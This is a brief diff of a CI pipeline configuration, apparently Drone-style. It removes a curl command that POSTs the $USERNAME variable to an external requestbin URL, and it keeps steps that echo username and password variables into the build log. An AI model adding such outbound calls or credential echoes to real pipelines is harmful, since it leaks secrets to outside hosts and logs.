@@ -15,8 +15,6 @@ steps:
 
   commands:
     - echo $GOOS
-    - apt-get update && apt-get install curl -y
-    - curl -X POST -d fizz=$USERNAME http://requestbin.fullcontact.com/1crg3js1
     - echo ${RPUEBA_1}
     - echo ${username}
     - echo ${password}
